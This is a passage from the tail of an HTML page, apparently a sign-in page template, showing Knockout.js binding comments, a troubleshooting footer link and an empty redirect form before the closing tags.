        externalCss: {
            &#39;footer-content&#39;: true,
            &#39;footer-item&#39;: true,
            &#39;debug-item&#39;: true,
            &#39;has-background&#39;: !useDefaultBackground,
            &#39;background-always-visible&#39;: hasDarkBackground }" aria-label="Click here for troubleshooting information" aria-expanded="false" class="footer-content ext-footer-content footer-item ext-footer-item debug-item ext-debug-item">...</a>
</div>
<!-- /ko -->

<!-- ko if: svr.fShowLegalMessagingInline && showLinks --><!-- /ko --></div>
    </div>
    <!-- /ko -->
</div>
<!-- /ko --></div>
        <!-- /ko -->

        <!-- ko if: isVerticalSplitTemplate() && isTemplateLoaded() --><!-- /ko -->
    <!-- /ko -->
<!-- /ko --></div>
    <!-- /ko -->
</form>

<form data-bind="postRedirectForm: postRedirect" method="POST" aria-hidden="true" target="_top"></form></div></body></html>
